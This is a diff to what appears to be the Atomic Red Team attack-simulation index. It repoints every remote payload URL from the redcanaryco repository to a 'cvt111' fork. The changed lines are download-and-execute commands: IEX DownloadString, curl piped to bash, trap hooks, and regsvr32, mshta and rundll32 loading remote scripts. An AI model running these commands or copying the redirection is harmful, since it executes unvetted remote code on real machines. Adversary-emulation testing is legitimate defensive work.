@@ -751,7 +751,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -772,7 +772,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -797,7 +797,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -3218,7 +3218,7 @@ persistence:
         name: powershell
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
           Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
     - name: Startup Folder
       description: 'Add Shortcut To Startup via PowerShell
@@ -3968,9 +3968,9 @@ persistence:
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap 'nohup curl -sS https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap 'nohup curl -sS https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
   T1100:
     technique:
       external_references:
@@ -4515,7 +4515,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -4536,7 +4536,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -4561,7 +4561,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -5195,7 +5195,7 @@ defense-evasion:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         command: 'hh.exe #{remote_chm_file}
@@ -7800,7 +7800,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1170/mshta.sct
       executor:
         name: command_prompt
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
@@ -8645,7 +8645,7 @@ defense-evasion:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1117/RegSvr32.sct
       executor:
         name: command_prompt
         command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
@@ -8856,7 +8856,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1085/T1085.sct
       executor:
         name: command_prompt
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
@@ -9167,7 +9167,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
       executor:
         name: command_prompt
         command: 'cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
@@ -9696,11 +9696,11 @@ defense-evasion:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -9742,7 +9742,7 @@ defense-evasion:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
@@ -15856,8 +15856,8 @@ execution:
       executor:
         name: sh
         command: |
-          bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-          bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+          bash -c "curl -sS https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
+          bash -c "wget --quiet -O - https://raw.githubusercontent.com/cvt111/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
   T1223:
     technique:
       external_references:
@@ -15948,7 +15948,7 @@ execution:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1223/src/T1223.chm
       executor:
         name: command_prompt
         command: 'hh.exe #{remote_chm_file}
@@ -16527,7 +16527,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1170/mshta.sct
       executor:
         name: command_prompt
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
@@ -16742,7 +16742,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1086/payloads/test.ps1
       executor:
         name: command_prompt
         command: 'powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object
@@ -16761,7 +16761,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1086/payloads/test.ps1
       executor:
         name: command_prompt
         command: 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject
@@ -16779,7 +16779,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1086/payloads/test.xml
       executor:
         name: command_prompt
         command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
@@ -16797,7 +16797,7 @@ execution:
         url:
           description: url of payload to execute
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
       executor:
         name: powershell
         command: '"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"
@@ -17030,7 +17030,7 @@ execution:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1117/RegSvr32.sct
       executor:
         name: command_prompt
         command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
@@ -17123,7 +17123,7 @@ execution:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1085/T1085.sct
       executor:
         name: command_prompt
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
@@ -17643,7 +17643,7 @@ execution:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
       executor:
         name: command_prompt
         command: 'cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
@@ -17844,9 +17844,9 @@ execution:
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap 'nohup curl -sS https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap 'nohup curl -sS https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
   T1127:
     technique:
       external_references:
@@ -18383,11 +18383,11 @@ execution:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -18429,7 +18429,7 @@ execution:
         remote_xsl_file:
           description: Remote location of an XSL payload.
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
@@ -19055,7 +19055,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -19076,7 +19076,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -19103,7 +19103,7 @@ lateral-movement:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -19666,7 +19666,7 @@ collection:
       - windows
       executor:
         name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
+        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
           > c:\windows\pi.log
 
 '
@@ -19680,7 +19680,7 @@ collection:
       - macos
       executor:
         name: bash
-        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+        command: curl -s https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1074/Discovery.sh
           | bash -s > /tmp/discovery.log
   '':
     technique:
@@ -19840,7 +19840,7 @@ collection:
             PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
 
           Download and Execute
-            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
+            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
   T1056:
     technique:
       external_references:
@@ -21000,7 +21000,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -21021,7 +21021,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
@@ -21048,7 +21048,7 @@ command-and-control:
         remote_file:
           description: URL of file to copy
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+          default: https://raw.githubusercontent.com/cvt111/atomic-red-team/master/LICENSE.txt
         local_path:
           description: Local path to place file
           type: Path
